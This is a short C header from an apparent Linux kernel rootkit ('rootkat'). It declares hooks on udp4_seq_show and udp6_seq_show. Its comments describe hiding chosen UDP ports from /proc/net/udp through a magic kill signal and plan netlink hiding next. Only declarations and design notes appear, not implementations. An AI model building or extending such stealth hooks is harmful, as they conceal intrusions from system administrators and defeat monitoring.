/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_UDP_SEQ_SHOW_H
#define ROOTKAT_HOOK_UDP_SEQ_SHOW_H

/*
 * udp4_seq_show / udp6_seq_show hooks — UDP counterpart of the TCP
 * port-hiding pair. Filters /proc/net/udp{,6} entries whose local port
 * is in the shared hidden_ports registry. Same magic-signal trigger
 * as TCP: kill(<port>, 62).
 *
 * NOTE: ss -ulnp uses NETLINK_SOCK_DIAG with IPPROTO_UDP, which goes
 * through a different fill path (udp_diag_dump → inet_diag_msg_attrs_fill).
 * Hooking the netlink path for UDP is a v3 milestone; v2 covers the
 * /proc/net/udp{,6} surface only.
 */
int rootkat_hook_udp4_seq_show_install(void);
void rootkat_hook_udp4_seq_show_remove(void);
int rootkat_hook_udp6_seq_show_install(void);
void rootkat_hook_udp6_seq_show_remove(void);

#endif
